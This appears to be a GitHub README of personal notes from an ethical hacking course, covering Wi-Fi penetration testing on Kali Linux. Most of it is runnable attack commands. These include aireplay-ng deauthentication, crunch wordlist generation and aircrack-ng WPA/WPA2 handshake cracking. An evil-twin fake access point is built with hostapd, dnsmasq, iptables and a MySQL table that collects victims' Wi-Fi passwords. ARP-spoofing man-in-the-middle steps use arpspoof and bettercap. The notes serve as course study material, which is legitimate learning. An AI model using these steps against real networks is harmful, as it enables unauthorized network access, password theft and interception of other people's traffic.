# Ethical-hacking
Referred course:
https://www.udemy.com/course/learn-ethical-hacking-from-scratch/

This repo includes to perform penetration testting, hacking wep/wpa/wpa2 encrypted wifi using Kali linux and much more.

Preferred wireless adapter:
1. should support monitor mode and packet injection.
2. should support both 2.5GHz and 5GHz frequency.
3. should be detectable in kali linux.

Airodump-ng :
1. is a part of aircrack-ng suite
2. its a packet sniffer.
3. capture all pkts within range.
4.display detailed info about network.
5. connected clinets etc.

You cannot access built-in wireless adapted from your virtual kali machine thats why you need a external wireless adapter.
1. my tplink wireless adapter AC1300 V3.0
https://www.amazon.in/TP-Link-Wireless-Adapter-Archer-T4U/dp/B01MR6M8EC/ref=pd_sbs_147_1/262-7248665-7296922?_encoding=UTF8&pd_rd_i=B01MR6M8EC&pd_rd_r=ba922f0a-a740-41fd-a68d-bb0f62839dcc&pd_rd_w=89GYC&pd_rd_wg=74VJn&pf_rd_p=00b53f5d-d1f8-4708-89df-2987ccce05ce&pf_rd_r=D9QSQ8KF54HK6DRBAMVX&psc=1&refRID=D9QSQ8KF54HK6DRBAMVX

It has realtek chipset and supports both 2.5Ghz and 5Ghz.
tplink  v2 chipset doesnt support monitor mode, only v1 does.
But you can configure v3 to support the v3 mode using below link.
https://www.youtube.com/watch?v=UTO5mA9_Wm0 --> youtube link to install realtek chipset on kali and enable montior mode.


=================

Configure the kail linux with root/toor credentials and make sure wlan0 is detectable.

WEP encryption algorithm:
1. Its based on RC4.
2. WEP generates a unique key.
3.a unique key is a combination of  = IV(24 bit plain text intialization vector) + key

WPA2 uses CCMP encryption while WPA uses 

================

1. airodump commands:
airodump-ng --band ang wlan0

2. capture packets on a particular MAC
airodump-ng --bssid F4:8C:EB:19:98:7E --channel 36 --write handshake wlan0

3. perform deauth attack on a particular device.
aireplay-ng --deauth 4 -a F4:8C:EB:19:98:7E -c 00:26:82:8D:21:1F wlan0

4. create password file using crunch
crunch 10 12 1235micky -o passwd.txt

5. cracking wpa/wpa2 using a crunch wordlist attack.
aircrack-ng handshake-01.cap -w passwd.txt

Note: Above command takes a lot of time if the size of wordlist is huge. Alternate way is to perform a twin AP attack. 

======================================================

Twin AP attack links:
1. https://www.youtube.com/watch?time_continue=1003&v=XaKJt6tSd6E&feature=emb_title

2. https://zsecurity.org/hack-wpa-wpa2-wifi-without-wordlist-using-evil-twin-attack/

3.  https://zsecurity.org/how-to-start-a-fake-access-point-fake-wifi/

==========
1. hostapd allows over wireless adapter to broadcast multiple acess point.
2. dnsmasq works as a dhcp server and also handles dns request.
3. apache2 used to give a webpage

cmds:
apt-get update
apt-get install hostapd dnsmasq apache2
enable wlan0 in monitor mode
mkdir ~/fap
cd fap

nano hostapd.conf
copy below content in the file:

interface=wlan0
driver=nl80211
ssid=centuryhome
hw_mode=g
channel=8 --> check the channel of your router & update accordingly
macaddr_acl=0
ignore_broadcast_ssid=0


My router default gw is 192.168.0.1, so updating dhcp-range & option accordingly

nano dnsmasq.conf
interface=wlan0
dhcp-range=192.168.0.2, 192.168.0.30, 255.255.255.0, 12h
dhcp.option=3, 192.168.0.1
dhcp-option=6, 192.168.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=192.168.0.1


#routing table and gateway
ifconfig wlan0 up 192.168.0.1 netmask 255.255.255.0
route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1

#ip table configuration 
We need to forward traffic from eth0, the  virtual wireless adapter that is connected to the internet, to wlan0. 
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward --> enal=ble ip forwarding

First command: Interface name that is used to forward traffic from.
Second command: Interface name to receive the packets or the interface that is being forwarded to.

#database config:

service mysql start
mysql
MariaDB [(none)]> create database fap;
MariaDB [(none)]> create user fapuser;
MariaDB [(none)]> grant all on rogueap.* to 'fapuser'@'localhost' identified by 'fappassword';
MariaDB [(none)]> grant all on fap.wpa_keys to 'fapuser'@'localhost' identified by 'fappassword';
MariaDB [(none)]> use fap;
MariaDB [fap]> create table wpa_keys(password1 varchar(40), password2 varchar(40));

MariaDB [fap]> ALTER DATABASE fap CHARACTER SET 'utf8';
MariaDB [fap]> select * from wpa_keys;


Now connect to the new unsecured wifi and type 192.168.0.1 in url.
Enter your wifi password.

check password in your database.
select * from wpa_keys;

=================================================

1. netdiscover is a tool to discover all the network devices connected to a wife including their mac addresses and manufacturer.
netdiscover -r 192.168.0.1/24

2. nmap/zenmap
type zenmap on terminal, a GUI window would pop up.
zenmap ia nothing but a GUI to run nmap.
Run a ping scan or quick scan to get loads of info.

====================================================

MITM using ARP spoofing

Its a 2 step process:
Consider eth0 is the wired interface of hacker's kali machine.
Make sure network is NATNETWORK for both kali machine and victim machine

10.0.2.1 -> default gw
10.0.2.4 -> victim's ip

1. Send ARP response to router(default gw) saying eth0 interface is at the IP of vicitm. -> Here router will update its arp table with eth0 MAC.
arpspoof -i eth0 -t 10.0.2.1 10.0.2.4

2. Send ARP response to victim saying eth0 is your default gateway. -> Here victim will update its arp table with eth0 mac.
arpspoof -i eth0 -t 10.0.2.4 10.0.2.1 

Now after this router will think victim is at eth0 and victim will think router is at eth0.
So all packets exchange between victim and router will go through eth0 interface and this is called Man in the middle attack.

One last step is to enable ip forwarding on kali machine.
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing using bettercap
bettercap -iface eth0
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 10.0.2.4
arp.spoof on
net.spoof on

